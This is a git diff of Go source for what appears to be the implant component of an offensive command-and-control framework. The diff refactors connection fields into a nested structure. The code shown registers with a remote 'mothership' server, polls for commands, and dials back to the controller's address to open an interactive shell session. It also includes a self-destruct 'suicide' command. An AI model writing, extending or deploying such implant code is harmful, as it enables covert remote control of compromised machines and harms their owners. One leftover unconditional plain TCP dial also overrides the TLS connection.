@@ -15,6 +15,7 @@ import(
   "io/ioutil"
   "crypto/x509"
   "github.com/alphamystic/odin/lib/utils"
+  //dfn"github.com/alphamystic/odin/lib/definers"
   "github.com/alphamystic/odin/lib/penguins/zoo"
   "github.com/alphamystic/odin/wheagle/server/grpcapi"
 )
@@ -29,7 +30,7 @@ func (iw *Implant) RunHTTPImplant(){
     work *grpcapi.Command
   )
   client = new(http.Client)
-  if iw.Tls {
+  if iw.Min.Tls {
     client = &http.Client{
 			Transport: &http.Transport{
 				TLSClientConfig: &tls.Config{
@@ -37,13 +38,13 @@ func (iw *Implant) RunHTTPImplant(){
 				},
 			},
 		}
-    url = fmt.Sprintf("https://%s",iw.Address)
+    url = fmt.Sprintf("https://%s",iw.Min.Address)
   } else {
     client = &http.Client{}
-    url = fmt.Sprintf("http://%s",iw.Address)
+    url = fmt.Sprintf("http://%s",iw.Min.Address)
   }
   //register
-  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",url,iw.MothershipID,iw.ISession.SessionID)
+  regUrl := fmt.Sprintf("%s/auth/?msid=%s&mid=%s",url,iw.Min.MothershipID,iw.Min.SessionID)
   req,err := http.NewRequest("GET",regUrl,nil)
   if err != nil{
     log.Println(err);return
@@ -107,25 +108,25 @@ func (iw *Implant) RunHTTPImplant(){
     var conn net.Conn
     if iw.Tls{
       roots := x509.NewCertPool()
-      ok := roots.AppendCertsFromPEM(iw.RootPem)
+      ok := roots.AppendCertsFromPEM(iw.Min.RootPem)
       if !ok {
         log.Println("Error appending cert to pool")
         return
       }
-      conn,err = tls.Dial("tcp",iw.Address, &tls.Config{
+      conn,err = tls.Dial("tcp",iw.Min.Address, &tls.Config{
         RootCAs: roots,
       })
       if err != nil{
         log.Println(err);goto START
       }
     } else {
-      conn,err = net.Dial("tcp",iw.Address)
+      conn,err = net.Dial("tcp",iw.Min.Address)
       if err != nil{
         log.Println(err);goto START
       }
     }
     // change thsi to check protocol for tcp/tls
-    conn,_ = net.Dial("tcp",iw.Address)
+    conn,_ = net.Dial("tcp",iw.Min.Address)
     Interactive(conn)
   case "suicide":
     output = "Initiating kill chain..........."
